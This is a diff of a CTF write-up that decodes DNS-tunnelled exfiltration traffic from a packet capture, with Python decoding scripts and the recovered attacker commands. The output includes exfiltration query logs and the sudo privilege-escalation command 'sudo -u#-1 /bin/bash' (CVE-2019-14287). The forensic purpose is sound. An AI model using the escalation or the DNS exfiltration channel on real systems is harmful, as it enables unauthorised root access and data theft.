@@ -19,34 +19,38 @@ Right after the first `SHELL:` response (`SHELL:hostname`), the pattern of queri
  ![New Queries](./6.png)
 
 This definitely looks like some sort of data being exfiltrated-- my first attempt at decoding was to just take everything after `echo` and try to decode it; since all of the characters appear to be in the hex range, I tried decoding it as hex bytes and interpreting them as ascii using python3:
-`>>> s = '0.7666742d7365637572652d7661756c742e7972722e636f7270'
+```python3
+>>> s = '0.7666742d7365637572652d7661756c742e7972722e636f7270'
 >>> data = s.replace('.','')
 >>> bytes.fromhex(data).decode('ascii')
 Traceback (most recent call last):
   File "<stdin>", line 1, in <module>
-ValueError: non-hexadecimal number found in fromhex() arg at position 51`
+ValueError: non-hexadecimal number found in fromhex() arg at position 51
+```
 
 This error isn't super helpful unfortunately-- what it's actually complaining about is that the string we're feeding to `bytes.fromhex` isn't an even number of characters, and thus can't be treated as hex bytes. My initial assumption was just that some data was missing, so I tried padding the stream out to an even length by adding another `0` to the front of it (this ended up being an incorrect assumption, but bear with me!). Decoding this new padded string, I got a usable result:
-`>>> s = '0.7666742d7365637572652d7661756c742e7972722e636f7270'
+```python3
+>>> s = '0.7666742d7365637572652d7661756c742e7972722e636f7270'
 >>> data = s.replace('.','')
 >>> data = '0'+data
 >>> bytes.fromhex(data).decode('ascii')
-'\x00vft-secure-vault.yrr.corp'`
+'\x00vft-secure-vault.yrr.corp'
+```
 
 Now, recall that the previous packet we saw contained `SHELL:hostname`; this response looks an awful lot like a hostname, so it seems we may be seeing the output of the `hostname` command being exfiltrated in this query.
 
 At this point, some less-manual inspection was in order; probably the most correct way to proceed from here would have been to use tshark or scapy to parse the capture and extract the hostnames being queried and decode them. However, this was a CTF and I wanted something quick and dirty, so instead I used wireshark's filter, copy and paste features to export what I needed. The filter I used for this was `ipv6.addr == fd00:6e73:6563:3232::23 and dns.qry.name contains "echo"`. This export wasn't entirely trivial due to some UI weirdness with wireshark. Bringing up the right click context menu to copy packets will also clear the current selection, and we want to select everything, so I ended up selecting everything with ctrl-a, then using the edit menu to pull up the copy context menu instead of right clicking. I copied all the packets in my selection as CSV-- a sample of the output follows:
 
-`
+```
 "No.","Time","Source","Destination","Protocol","Length","Info"
 "1053","92.931525346","fd00:6e73:6563:3232::23","fd00:6e73:6563:3232::100","DNS","157","Standard query 0xcf43 AAAA 0.7666742d7365637572652d7661756c742e7972722e636f7270.echo.474f415453.wpad.ctf"
 "1056","93.039684707","fd00:6e73:6563:3232::100","fd00:6e73:6563:3232::23","DNS","185","Standard query response 0xcf43 AAAA 0.7666742d7365637572652d7661756c742e7972722e636f7270.echo.474f415453.wpad.ctf AAAA 0:4f4b::"
 "1522","109.257521570","fd00:6e73:6563:3232::23","fd00:6e73:6563:3232::100","DNS","129","Standard query 0x9b98 AAAA 0.726f7369652e6d65796572.echo.474f415453.wpad.ctf"
 "1530","109.514634653","fd00:6e73:6563:3232::100","fd00:6e73:6563:3232::23","DNS","157","Standard query response 0x9b98 AAAA 0.726f7369652e6d65796572.echo.474f415453.wpad.ctf AAAA 0:4f4b::"
-`
+```
 
 This is the quick and dirty code that I used as a first pass to extract the exfiltrated data (note that it doesn't grab the commands being executed, no real reason other than laziness). This code slightly differs from what I was doing in the above examples, in that it just takes the entirety of the long hex label, and ignores the leading 0. label:
-`
+```python3
 import sys
 lines = open(sys.argv[1]).readlines()
 for line in lines[1:]:
@@ -64,11 +68,11 @@ for line in lines[1:]:
 
         print(bytes.fromhex(parameter).decode())
 
-`
+```
 
 However, this code didn't work as well as I'd hoped:
 
-`
+```shell
 danny@corvid:~/Documents/ctf/portabello$ python3 parse_1.py portabello_commands.csv 
 vft-secure-vault.yrr.corp
 rosie.meyer
@@ -81,11 +85,11 @@ Traceback (most recent call last):
     print(bytes.fromhex(parameter).decode())
 ValueError: non-hexadecimal number found in fromhex() arg at position 63
 
-`
+```
 This error looks familiar-- it seems that some of our labels aren't even-length hex strings. Looking at the 
 
 
-`
+```python3
 import sys
 lines = open(sys.argv[1]).readlines()
 builder = ''
@@ -111,10 +115,10 @@ for line in lines[1:]:
                 print('resp',txt)
             except:
                 print('error',builder)
-`
+```
 
 It produced the following result:
-`
+```shell
 danny@corvid:~/Documents/ctf/portabello$ python3 parse_1.py portabello_commands.csv 
 resp vft-secure-vault.yrr.corp
 resp vft-secure-vault.yrr.corprosie.meyer
@@ -147,7 +151,7 @@ drwxr-xr-x  3 root root 4096 Jan  4 13:20 .local
             Wallet private:  L5mj2Yt5rfYXprowC8pUBsyC9R1PgKKpfQSNqcBRZBiaXUg5bi5s
             flag-blockchaiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiin
             In posuere, nisl eu aliquet ultrices, urna elit aliquam mi, vel suscipit ante nibh eget nibh. Sed massa lorem, condimentum ut odio at, rutrum iaculis lectus. Aenean libero arcu, pretium dapibus nunc auctor, lacinia gravida lorem. Duis vitae vulputate ligula. Quisque tincidunt risus nec luctus ornare. Curabitur sed sagittis odio. Vivamus a leo id diam bibendum gravida. Integer efficitur ultrices odio. Aliquam egestas, nisl et mollis lobortis, augue leo consectetur enim, quis dictum justo sapien et justo.
-`
+```
 
 We can see the flag in this response! After submitting the flag, we got another hint for the final flag:
 
@@ -158,7 +162,7 @@ Use this format: flag-bargaining\_{MD5 hash of the string CVE-XXXX-YYYYYYYYYY} (
 
 
 So, now we need to actually extract the commands used-- we can do this by modifying our script:
-`
+```python3
 import sys
 lines = open(sys.argv[1]).readlines()
 builder = ''
@@ -196,12 +200,11 @@ for line in lines[1:]:
                 txt = b.decode('ascii')
                 print('resp',txt)
             except:
-                print('error',builder)
-~                                      
-`
+                print('error',builder)                             
+```
 
 This produces the following (somewhat voluminous) output:
-`
+```shell
 danny@corvid:~/Documents/ctf/portabello$ python3 parse.py portabelloextract.txt 
 heartbeat
 cmd NO
@@ -414,23 +417,23 @@ heartbeat
 cmd NO
 heartbeat
 cmd QUIT
-`
+```
 
 Amongst this output, the section that caught my eye was:
 
-`
+```
 cmd SHELL:id -un
 resp vft-secure-vault.yrr.corprosie.meyerOKSudo version 1.8.27OKroot
-`
+```
 
 Since this line shows the user is now root, we can assume that whatever happened before it was probably the privilege escalation we're looking for-- looking upwards in the output, we see the following:
 
-`
+```
 cmd SHELL:sudo -u#
 heartbeat
 cmd -1 /bin/bash
 resp vft-secure-vault.yrr.corprosie.meyerOKSudo version 1.8.27OK
-`
+```
 
 This, combined with the output showing the sudo version is enough to search for sudo exploits that might match-- a quick google search for "sudo -u#-1" pulls up immediate hits for CVE-2019-14287, which was a sudo privilege escalation vulnerability. I then spent far longer than I should have attempting to submit the result of
 `echo 'CVE-2019-14287' | md5sum`
